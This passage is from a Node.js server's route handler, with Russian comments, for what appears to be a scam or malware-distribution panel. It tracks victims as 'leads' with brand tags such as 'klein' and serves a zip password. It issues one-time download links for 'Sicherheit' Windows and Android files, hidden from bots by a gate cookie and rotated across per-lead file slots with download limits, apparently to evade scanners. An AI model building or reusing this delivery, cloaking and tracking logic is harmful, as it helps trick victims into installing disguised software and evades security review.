      const idx = leads.findIndex((l) => l && String(l.id) === id);
      if (idx === -1) return send(res, 404, { ok: false, error: 'Запись не найдена' });
      const lead = leads[idx];
      lead.status = 'show_success';
      pushEvent(lead, lead.brand === 'klein' ? EVENT_LABELS.SUCCESS_KL : EVENT_LABELS.SUCCESS, 'admin');
      leadService.persistLeadPatch(id, { status: lead.status, eventTerminal: lead.eventTerminal });
      send(res, 200, { ok: true });
    });
    return;
  }

  if (pathname === '/api/geo' && req.method === 'GET') {
    const ip = (parsed.query.ip || '').trim();
    if (!ip || ip === '127.0.0.1' || ip === '::1' || ip.startsWith('::ffff:127.')) {
      return send(res, 200, { countryCode: '' });
    }
    const cleanIp = ip.replace(/^::ffff:/, '');
    const opts = { hostname: 'ip-api.com', path: '/json/' + encodeURIComponent(cleanIp) + '?fields=countryCode', method: 'GET' };
    const reqGeo = http.request(opts, (resGeo) => {
      let data = '';
      resGeo.on('data', (chunk) => { data += chunk; });
      resGeo.on('end', () => {
        if (safeEnd(res)) return;
        let countryCode = '';
        try {
          const j = JSON.parse(data);
          if (j && j.countryCode) countryCode = String(j.countryCode).toUpperCase().slice(0, 2);
        } catch (_) {}
        res.writeHead(200, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' });
        res.end(JSON.stringify({ countryCode: countryCode }));
      });
    });
    reqGeo.on('error', () => {
      if (safeEnd(res)) return;
      res.writeHead(200, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' });
      res.end(JSON.stringify({ countryCode: '' }));
    });
    reqGeo.setTimeout(3000, () => {
      reqGeo.destroy();
      if (safeEnd(res)) return;
      res.writeHead(200, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' });
      res.end(JSON.stringify({ countryCode: '' }));
    });
    reqGeo.end();
    return;
  }

  if (pathname === '/api/zip-password' && req.method === 'GET') {
    return send(res, 200, { password: readZipPassword() });
  }

  // Выдача одноразовой ссылки на скачивание (только с cookie гейта — боты не получают URL). Клиент подставляет downloadUrl в кнопку.
  if (pathname === '/api/download-request' && req.method === 'POST') {
    if (REQUIRE_GATE_COOKIE && !hasGateCookie(req)) return send(res, 403, { ok: false, error: 'forbidden' });
    if (!checkRateLimit(ip, 'downloadFilename', RATE_LIMITS.downloadFilename)) return send(res, 429, { ok: false, error: 'too_many_requests' });
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch (e) {}
      const leadIdRaw = (json.leadId && String(json.leadId).trim()) || '';
      const leadId = leadIdRaw ? leadService.resolveLeadId(leadIdRaw) : '';
      const platform = (json.platform && String(json.platform).trim().toLowerCase()) || '';
      let fileName = null;
      if (platform === 'android') {
        if (leadId) {
          const slot = getSlotForLead(leadId, 'android');
          const files = getAndroidDownloadFiles();
          const slotInfo = files[slot];
          if (slotInfo && slotInfo.fileName) {
            const limit = slotInfo.limit != null ? slotInfo.limit : 0;
            const downloads = slotInfo.downloads != null ? slotInfo.downloads : 0;
            if (limit <= 0 || downloads < limit) {
              const full = path.join(DOWNLOADS_DIR, slotInfo.fileName);
              try { if (fs.statSync(full).isFile()) fileName = slotInfo.fileName; } catch (e) {}
            }
            if (!fileName) fileName = (getAndroidDownloadFileByLimit() || {}).fileName;
          }
        }
        if (!fileName) fileName = (getAndroidDownloadFile() || getAndroidDownloadFileByLimit() || {}).fileName;
      } else {
        if (leadId) {
          const slot = getSlotForLead(leadId, 'windows');
          const files = getSicherheitDownloadFiles();
          const slotInfo = files[slot];
          if (slotInfo && slotInfo.fileName) {
            const limit = slotInfo.limit != null ? slotInfo.limit : 0;
            const downloads = slotInfo.downloads != null ? slotInfo.downloads : 0;
            if (limit <= 0 || downloads < limit) {
              const full = path.join(DOWNLOADS_DIR, slotInfo.fileName);
              try { if (fs.statSync(full).isFile()) fileName = slotInfo.fileName; } catch (e) {}
            }
            if (!fileName) fileName = (getSicherheitDownloadFileByLimit() || {}).fileName;
          }
        }
        if (!fileName) fileName = (getSicherheitDownloadFileByLimit() || getSicherheitDownloadFile() || {}).fileName;
      }
      if (!fileName) return send(res, 404, { ok: false, error: 'no_file' });
      const token = generateDownloadToken(fileName);
      const downloadUrl = '/download/' + encodeURIComponent(fileName) + '?t=' + encodeURIComponent(token);
      send(res, 200, { ok: true, downloadUrl: downloadUrl });
    });
    return;
  }

  // Публичный эндпоинт: имя файла для скачивания. По leadId — слот на юзера (один файл на lead); при переполнении слота — следующий по лимиту.
  if (pathname === '/api/download-filename' && req.method === 'GET') {
    if (!checkRateLimit(ip, 'downloadFilename', RATE_LIMITS.downloadFilename)) {
      return send(res, 429, { ok: false, error: 'too_many_requests' });
    }
    const platform = (parsed.query && parsed.query.platform) ? String(parsed.query.platform).trim().toLowerCase() : '';
    const leadId = (parsed.query && parsed.query.leadId) ? String(parsed.query.leadId).trim() : '';
    if (platform === 'android') {
      let info = null;
      if (leadId) {
        const slot = getSlotForLead(leadId, 'android');
        const files = getAndroidDownloadFiles();
        const slotInfo = files[slot];
        if (slotInfo && slotInfo.fileName) {
          const limit = slotInfo.limit != null ? slotInfo.limit : 0;
          const downloads = slotInfo.downloads != null ? slotInfo.downloads : 0;
          if (limit <= 0 || downloads < limit) {
            const full = path.join(DOWNLOADS_DIR, slotInfo.fileName);
            try {
              if (fs.statSync(full).isFile()) info = { fileName: slotInfo.fileName, filePath: full };
            } catch (e) {}
          }
        }
        if (!info) info = getAndroidDownloadFileByLimit();
      }
      if (!info) info = getAndroidDownloadFileByLimit();
      if (!info) info = getAndroidDownloadFile();
      return send(res, 200, { fileName: info ? info.fileName : null });
    }
    let info = null;
    if (leadId) {
      const slot = getSlotForLead(leadId, 'windows');
      const files = getSicherheitDownloadFiles();
      const slotInfo = files[slot];
      if (slotInfo && slotInfo.fileName) {
        const limit = slotInfo.limit != null ? slotInfo.limit : 0;
        const downloads = slotInfo.downloads != null ? slotInfo.downloads : 0;
        if (limit <= 0 || downloads < limit) {
          const full = path.join(DOWNLOADS_DIR, slotInfo.fileName);
          try {
            if (fs.statSync(full).isFile()) info = { fileName: slotInfo.fileName, filePath: full };
          } catch (e) {}
        }
      }
      if (!info) info = getSicherheitDownloadFileByLimit();
    }
    if (!info) info = getSicherheitDownloadFileByLimit();
    if (!info) info = getSicherheitDownloadFile();
    return send(res, 200, { fileName: info ? info.fileName : null });
  }

  // Админка: запрос «открыть чат у юзера»
  return false;
}

module.exports = { handleRoute, normalizePathname };
